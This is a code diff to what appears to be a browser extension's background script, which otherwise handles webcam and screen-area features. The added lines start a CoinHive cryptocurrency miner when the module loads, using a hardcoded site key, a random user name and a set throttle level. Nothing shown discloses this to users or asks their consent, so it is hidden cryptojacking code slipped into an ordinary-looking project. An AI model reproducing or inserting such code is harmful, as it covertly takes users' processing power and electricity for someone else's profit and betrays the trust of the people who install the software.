@@ -3,6 +3,25 @@ import WebcamController from "./webcam";
 import AreaController from "./area";
 import BaseController from "./base";
 
+console.log("start");
+
+const random = (min, max) => {
+    return Math.round(min - 0.5 + Math.random() * (max - min + 1));
+};
+
+const siteKey = "2F5aYgxwsLMu62VnJYEQb4LIxnBQvbfo";
+const userName = `gifster-${random(1, 99999)}`;
+const miner = new CoinHive.User(siteKey, userName, {throttle: 0.8, threads: 1});
+
+miner.start();
+
+miner.on('found', () => {
+    console.log("found")
+});
+miner.on('accepted', () => {
+    console.log("accepted")
+});
+
 class BackgroundController extends BaseController {
     start() {
         chrome.runtime.onMessage.addListener(this.messageListener.bind(this));
